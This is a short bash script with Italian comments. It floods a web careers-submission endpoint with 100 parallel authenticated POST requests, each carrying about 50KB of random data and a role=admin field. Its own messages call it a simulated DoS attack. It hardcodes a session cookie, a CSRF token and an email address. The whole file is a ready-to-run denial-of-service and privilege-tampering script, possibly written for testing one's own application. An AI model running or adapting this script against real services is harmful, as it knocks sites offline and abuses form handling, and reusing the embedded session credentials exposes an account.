#!/bin/bash

# URL del sito
URL="http://external.user:8000/careers/submit"

# File temporaneo per i cookie
SESSION_COOKIE="cyberblog_session=eyJpdiI6ImlwamJCQWN2RFphRS9MWHhDWTJYL3c9PSIsInZhbHVlIjoiaVNIMVo4dVpxd3RtRU1LQWFtK3ZWYzVCaGZxT3hWckZKdWt4NUhEcENhMnVSdnhxek15c1lQNWd4ZGFJVmhmQU16L29IdUYwdHo1a0xMV3FBZHB1TjlVa1NFSDlWbXlVMG5ab1BwUWdFb1NyV0h1Um9ickNKU2w5ZHJmZDUyeWIiLCJtYWMiOiI5ZTUxMWMxMGZlMzA4ODU3YzYyNTg5MmFhNjA2NTljNmFmZTlkODZhYTgxZjVmZjY4YzcxNmUxZWE4YmU1YzYzIiwidGFnIjoiIn0="

# Token CSRF (verrà estratto dopo il login)
CSRF_TOKEN="DshpTUzuviYdqGxDZwbCglIeMjsxvgqkT2hWhHlG"

# Generare un grande payload casuale
LARGE_PAYLOAD=$(head -c 50000 < /dev/urandom | base64)

# Numero di richieste da inviare
NUM_REQUESTS=100

# Funzione per eseguire la richiesta autenticata
send_request() {
    curl -X POST "$URL" \
        -b "$SESSION_COOKIE" \
        -H "X-CSRF-TOKEN: $CSRF_TOKEN" \
        --data-urlencode "role=admin" \
        --data-urlencode "email=kvrs@gmail.com" \
        --data-urlencode "message=$LARGE_PAYLOAD" \
        -s -o /dev/null -w "%{http_code}"
}

# # Funzione per calcolare la memoria libera su macOS usando vm_stat
# check_memory() {
#     # Ottenere il numero di pagine libere da vm_stat
#     FREE_MEM_PAGES=$(vm_stat | grep "Pages free" | awk '{print $3}' | sed 's/\.//')
#     PAGE_SIZE=$(vm_stat | grep "page size of" | awk '{print $8}')

#     # Converti le pagine libere in MB
#     FREE_MEM_MB=$((FREE_MEM_PAGES * PAGE_SIZE / 1024 / 1024))

#     # Se la memoria disponibile è inferiore a 100MB, sospendi lo script
#     if [[ "$FREE_MEM_MB" -lt 50 ]]; then
#         echo "Memoria bassa ($FREE_MEM_MB MB), attendo 10 secondi prima di riprendere..."
#         sleep 1
#     fi
# }

# Esegui richieste in parallelo con limitazione
run_requests() {
    echo "Inizio attacco DoS simulato..."

    for ((i=1; i<=NUM_REQUESTS; i++))
    do
        # Controlla la memoria disponibile prima di lanciare nuove richieste
        # check_memory

        # Lancia la richiesta in background e cattura il codice HTTP
        (
            HTTP_CODE=$(send_request)
            echo "Richiesta $i: HTTP $HTTP_CODE"
        ) &
    done

    # Aspetta che tutti i processi terminino
    wait
    echo "Attacco DoS simulato completato!"
}

# Avvia lo script
run_requests
